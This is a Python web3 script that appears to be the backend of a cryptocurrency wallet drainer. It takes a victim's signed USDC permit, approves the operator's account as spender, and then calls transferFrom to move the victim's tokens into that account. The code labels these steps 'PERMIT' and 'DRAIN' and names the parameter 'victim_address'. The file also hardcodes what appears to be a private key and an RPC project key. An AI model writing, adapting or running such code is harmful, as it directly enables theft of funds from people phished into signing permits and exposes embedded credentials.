import os
from web3 import Web3

# Configuration
RPC_URL = "https://mainnet.infura.io/v3/df3f921aa86a4c559eb527db6961ab74"
ADMIN_PRIVATE_KEY = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

USDC_ABI = [
    {
        "inputs": [
            {"name": "owner", "type": "address"}, {"name": "spender", "type": "address"},
            {"name": "value", "type": "uint256"}, {"name": "deadline", "type": "uint256"},
            {"name": "v", "type": "uint8"}, {"name": "r", "type": "bytes32"}, {"name": "s", "type": "bytes32"}
        ],
        "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function"
    },
    {
        "inputs": [
            {"name": "from", "type": "address"}, {"name": "to", "type": "address"},
            {"name": "value", "type": "uint256"}
        ],
        "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "stateMutability": "nonpayable", "type": "function"
    }
]

# EXACTLY 6 ARGUMENTS
def execute_usdc_transfer(victim_address, amount, deadline, v, r, s):
    try:
        admin_account = w3.eth.account.from_key(ADMIN_PRIVATE_KEY)
        contract = w3.eth.contract(address=Web3.to_checksum_address(USDC_ADDRESS), abi=USDC_ABI)

        r_bytes = w3.to_bytes(hexstr=r)
        s_bytes = w3.to_bytes(hexstr=s)
        current_nonce = w3.eth.get_transaction_count(admin_account.address)

        # 1. PERMIT
        permit_tx = contract.functions.permit(
            Web3.to_checksum_address(victim_address),
            admin_account.address,
            int(amount),
            int(deadline),
            int(v),
            r_bytes,
            s_bytes
        ).build_transaction({
            "from": admin_account.address,
            "nonce": current_nonce,
            "gas": 100000,
            "gasPrice": w3.eth.gas_price,
            "chainId": 1
        })

        signed_permit = w3.eth.account.sign_transaction(permit_tx, ADMIN_PRIVATE_KEY)
        w3.eth.send_raw_transaction(signed_permit.raw_transaction)

        # 2. DRAIN
        transfer_tx = contract.functions.transferFrom(
            Web3.to_checksum_address(victim_address),
            admin_account.address,
            int(amount)
        ).build_transaction({
            "from": admin_account.address,
            "nonce": current_nonce + 1,
            "gas": 100000,
            "gasPrice": w3.eth.gas_price,
            "chainId": 1
        })

        signed_transfer = w3.eth.account.sign_transaction(transfer_tx, ADMIN_PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_transfer.raw_transaction)

        return tx_hash.hex(), None

    except Exception as e:
        return None, str(e)
